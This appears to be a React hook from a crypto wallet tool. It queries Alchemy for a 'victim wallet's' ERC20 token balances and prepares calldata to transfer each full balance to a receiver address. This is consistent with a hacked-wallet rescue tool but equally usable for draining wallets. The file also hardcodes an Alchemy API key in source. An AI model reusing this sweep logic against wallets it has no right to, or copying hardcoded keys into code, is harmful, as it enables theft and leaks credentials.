import { Alchemy, Network } from 'alchemy-sdk';
import { useState } from 'react';
import { toast } from 'sonner';
import { useLocalStorage } from 'usehooks-ts';
import { encodeFunctionData, formatUnits, fromHex, isAddress } from 'viem';

import ERC20_ABI from '@/constants/abis/erc20.json';
import { ITokenMetadata } from '@/types/tokens';

export const useDetectTokens = () => {
  const [detectedAssets, setDetectedAssets] = useLocalStorage<{
    [account: string]: ITokenMetadata[];
  }>('detectedAssets', {});

  const [alchemy] = useState<Alchemy>(
    new Alchemy({
      apiKey: 'MbGU597_l6VQgQ5Cv3bpJsZmYx4gb6cN', // TODO: move to env
      network:
        process.env.NEXT_PUBLIC_NETWORK === 'sepolia'
          ? Network.ETH_SEPOLIA
          : Network.ETH_MAINNET,
    }),
  );

  const getDetectedTokens = async (
    victimWalletAddress: string,
    recieverWalletAddress = '0x0000000000000000000000000000000000000000',
    forceFetch = false,
  ): Promise<ITokenMetadata[] | undefined> => {
    if (!isAddress(victimWalletAddress)) {
      toast.error('Invalid wallet address');
      return undefined;
    }

    if (!alchemy) {
      toast.error('Api rate limit has been reached. Please try again later.');
      return undefined;
    }

    if (
      detectedAssets[victimWalletAddress] &&
      detectedAssets[victimWalletAddress].length > 0 &&
      !forceFetch
    ) {
      return detectedAssets[victimWalletAddress];
    }

    try {
      const tokensWithMetadata: ITokenMetadata[] = [];

      const erc20Balances =
        await alchemy.core.getTokenBalances(victimWalletAddress);

      await Promise.all(
        erc20Balances.tokenBalances.map(async (token: any) => {
          const balance = BigInt(token.tokenBalance || '0');
          if (balance === BigInt(0)) return;

          const metadata = await alchemy.core.getTokenMetadata(
            token.contractAddress,
          );

          const tokenMetadata: ITokenMetadata = {
            type: 'erc20',
            address: token.contractAddress,
            info: `ERC20 - ${token.contractAddress || metadata.symbol || metadata.name}`?.toLowerCase(),
            symbol: metadata.symbol || '',
            amount: formatUnits(
              fromHex(token.tokenBalance || '0x00', 'bigint'),
              metadata.decimals || 18,
            ),
            amountBigInt: fromHex(
              token.tokenBalance || '0x00',
              'bigint',
            ).toString(),
            decimals: metadata.decimals || 18,
            toEstimate: {
              from: victimWalletAddress as `0x${string}`,
              to: token.contractAddress as `0x${string}`,
              data: encodeFunctionData({
                abi: ERC20_ABI,
                functionName: 'transfer',
                args: [recieverWalletAddress, token.tokenBalance],
              }) as `0x${string}`,
            },
          };
          tokensWithMetadata.push(tokenMetadata);
        }),
      );

      setDetectedAssets((prev: { [account: string]: ITokenMetadata[] }) => ({
        ...prev,
        [victimWalletAddress]: tokensWithMetadata,
      }));

      return tokensWithMetadata;
    } catch (e) {
      console.error(`Error fetching assets of victim wallet: ${e}`);
      return undefined;
    }
  };

  return {
    getDetectedTokens,
  };
};
